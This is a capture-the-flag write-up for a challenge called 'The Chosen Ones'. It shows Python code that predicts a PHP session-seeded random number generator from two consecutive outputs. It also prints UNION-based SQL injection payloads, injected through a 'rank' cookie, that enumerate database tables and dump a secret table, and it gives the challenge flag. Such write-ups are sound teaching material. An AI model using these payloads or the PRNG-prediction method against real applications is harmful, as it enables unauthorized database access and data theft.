# The Chosen Ones
![picture 0](images/3a8d63c57e3d82cbe6e196d41894cba0a9466efdd0ed51c2007c6e3100f61b4c.png)  

## Comment
We are provided with PALINDROME's recruitment site whereby we have to guess a number from `0 to 999999`, and if we guess it correctly, we can get access. On each guess, the website will provide the actual correct number back to us. Accessing the source code of the html file, we are hinted with a comment:

`<!-- MZ2W4Y3UNFXW4IDSMFXGI33NFAUXWJDQOJSXMIB5EASF6U2FKNJUST2OLMRHGZLFMQRF2OZEMN2XE4TFNZ2CAPJAFBUW45BJERYHEZLWEBPCAOBUGQ3TIMRZGA3DWIBEMN2XE4TFNZ2CAPJAMRSWGYTJNYUCIY3VOJZGK3TUFE5XO2DJNRSSQ43UOJWGK3RIERRXK4TSMVXHIKJ4GMZCS6ZEMN2XE4TFNZ2CAPJAEIYCELREMN2XE4TFNZ2DW7JEMZUXE43UEA6SA43VMJZXI4RIERRXK4TSMVXHILBQFQ3SSOZEONSWG33OMQQD2IDTOVRHG5DSFASGG5LSOJSW45BMG4WDENJJHMSGG5LSOJSW45BAHUQCI43FMNXW4ZBOERTGS4TTOQ5SIY3VOJZGK3TUEA6SAYTJNZSGKYZIERRXK4TSMVXHIKJ3ERPVGRKTKNEU6TS3EJZWKZLEEJOSAPJAERRXK4TSMVXHIO3SMV2HK4TOEASGG5LSOJSW45BFGEYDAMBQGAYDW7I -->`

The comment is base32 encoded:

```php
function random(){
    $prev = $_SESSION["seed"];
    $current = (int)$prev ^ 844742906; 
    $current = decbin($current);
    while(strlen($current)<32){
        $current = "0".$current;
    }
    $first = substr($current,0,7);
    $second = substr($current,7,25);
    $current = $second.$first;
    $current = bindec($current);
    $_SESSION["seed"] = $current;
    return $current%1000000;
}
```

The pseudo-random generation function uses a seed to generate the next number. Interestingly, the seed is updated to `$current`, but when we the application returns the value, the `$current` value goes through a modulo 1000000, this will cause us to lose information on the `$_SESSION["seed"]`.

However, it is possible to retrieve the **PREVIOUS** `$_SESSION["seed"]`, by using two consecutive return values!

Let the first return value be `x` and the second return value be `y`. We know that `x` is related to the `seed_y` that is used to generate `y` (i.e., `x` = `seed_y` % 1000000). This means that if we iterate from values `x`, `x + 1000000`, `x + 2000000`, ..., we will be able to find the value of `seed_y` that will generate `y`. Because the number of bits used in the pseudo-random generation is 32bits, the maximum value `seed_y` could be should be around `2^32`. The below python code will allow us to recover `seed_y`, given two consecutive return values.

```python
first_return_value = 211278
second_return_value = 544885

def generate_next_value(prev_value):
    prev_value = int(prev_value)
    current = prev_value ^ 844742906  # XOR operation

    # Convert to binary and ensure a 32-bit length
    current = bin(current)[2:].zfill(32)

    # Bit manipulation (reordering)
    first = current[:7]
    second = current[7:]
    current = second + first

    # Convert back to decimal
    current = int(current, 2)
    
    return current % 1000000, current

for first_seed in range(first_return_value, 2**32, 1000000): # iterate through all possible values of seed_x
    if generate_next_value(first_seed)[0] == second_return_value:
        print(generate_next_value(first_seed)[1]) # seed_y
```

After we obtain `seed_y`, we can use it to find the value of the next `$_SESSION["seed"]` (say `seed_z`), and thus obtain the next return value `z`. The python code is modified as follows to obtain the third (unknown) return value from the first (known) and second (known) return values.

```python
first_return_value = 211278
second_return_value = 544885

def generate_next_value(prev_value):
    prev_value = int(prev_value)
    current = prev_value ^ 844742906  # XOR operation

    # Convert to binary and ensure a 32-bit length
    current = bin(current)[2:].zfill(32)

    # Bit manipulation (reordering)
    first = current[:7]
    second = current[7:]
    current = second + first

    # Convert back to decimal
    current = int(current, 2)

    return current % 1000000, current

for first_seed in range(first_return_value, 2**32, 1000000):
    if generate_next_value(first_seed)[0] == second_return_value:
        print(generate_next_value(generate_next_value(first_seed)[1])[0])
```


## SQL INJECTION into rank
After entering in the correct value, we are presented with a page with two input fields (First Name and Last Name), there is also another input field in the `rank` cookie.

I first used sqlmap in the more intense mode and it detected SQLi in the `rank` cookie. Upon this discovery, finding the flag required enumerating the tables available, and then dumping out contents from a `CTF_SECRET` table.

```json
0 UNION ALL SELECT @@version,NULL,NULL,NULL UNION SELECT TABLE_CATALOG, TABLE_SCHEMA, TABLE_NAME, TABLE_TYPE FROM information_schema.tables--
```

| | | | |
| -- | -- | -- | -- |
| def	| palindrome	| CTF_SECRET| 	BASE TABLE |
|def	|palindrome|	PERSONNEL|	BASE TABLE|

```json
0 UNION ALL SELECT @@version,NULL,NULL,NULL UNION SELECT COLUMN_NAME, NULL, NULL, NULL FROM information_schema.columns WHERE table_name = 'CTF_SECRET'--
```

>flag

```json
0 UNION ALL SELECT @@version,NULL,NULL,NULL UNION SELECT flag, NULL, NULL, NULL FROM CTF_SECRET--
```
>TISC{Y0u_4rE_7h3_CH0s3n_0nE}	